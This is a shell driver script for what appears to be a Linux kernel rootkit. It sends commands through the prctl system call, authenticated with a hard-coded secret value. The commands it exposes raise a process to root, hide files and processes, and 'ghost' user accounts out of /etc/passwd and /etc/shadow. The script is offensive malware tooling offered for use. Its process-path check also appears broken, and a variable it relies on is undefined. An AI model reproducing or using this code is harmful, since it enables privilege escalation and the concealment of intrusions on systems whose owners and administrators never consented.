#!/usr/bin/env sh
# Copyright 2019 Bailey Defino
# <https://bdefino.github.io>

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

# simple driver script
# Usage: ./$0 COMMAND [ULONG | 0xHEXULONG | CARRAY ...]
# CALL
#   system call number
# COMMAND
#   module command to execute
#     drop PID -> set a process's EUID to its UID
#     elevate PID -> set a process's EUID to root
#     ghost UID -> remove a user from "/etc/passwd" and "/etc/shadow"
#     hide PATH -> hide an entity ("/proc" paths are treated as processes)
#     show PATH -> show a hidden entity ("/proc" paths are treated as processes)
#     unghost UID -> replace a user in "/etc/passwd" and "/etc/shadow"
CALL=157 # `sys_prctl`
[ -z "$1" ] && echo "Expected a command." >&2 && exit 1
COMMAND="$1"
COMMAND_LEN=`echo -n "${COMMAND}" | wc -c`
SECRET=0xDEADBEEFDEADBEEF
REST=`echo -n "$@" | cut "-c$(( ${COMMAND_LEN} + 1 ))-"`

if [ "${COMMAND}" = hide ] || [ "${COMMAND}" = show ]
then
  for _PATH in $@
  do
    if [ "$(echo -n \"${_PATH}\" | cut -c 6)" = "/proc/" ]
    then
      # it's likely a process; delegate

      ./syscall "${CALL}" "${SECRET}" "@${COMMAND}" "@${_PATH}"
    elif [ "${COMMAND}" = hide ]
    then
      # hide via rename

      mv "${_PATH}" "${PREFIX}${_PATH}"
    else
      # show via rename

      mv "${PREFIX}${_PATH}" "${_PATH}"
    fi
  done
else
  ./syscall "${CALL}" "${SECRET}" "@${COMMAND}" ${REST}
fi

